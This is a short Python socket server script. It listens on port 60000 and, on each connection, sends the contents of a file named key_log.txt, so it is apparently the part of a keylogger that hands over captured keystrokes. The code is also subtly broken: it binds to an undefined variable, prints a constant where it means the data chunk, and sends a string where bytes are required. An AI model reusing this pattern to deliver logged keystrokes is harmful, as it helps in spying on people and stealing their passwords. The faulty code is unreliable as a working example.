import socket
port = 60000
s = socket.socket()
host = socket.gethostname()
s.bind((bind, port))
s.listen(5)

print('Server is listening...')

while True:
    conn,addr = s.accept()
    print('Connection from',addr)
    data = conn.recv(1024)
    print('Server recieved', repr(data))

    filename='key_log.txt'
    f = open(filename,'rb')
    l = f.read(1024)
    while (l):
        conn.send(l)
        print('Sent', repr(1))
        l = f.read(1024)
    f.close()

    print('Done sending')
    conn.send('Connection closing')
    conn.close()
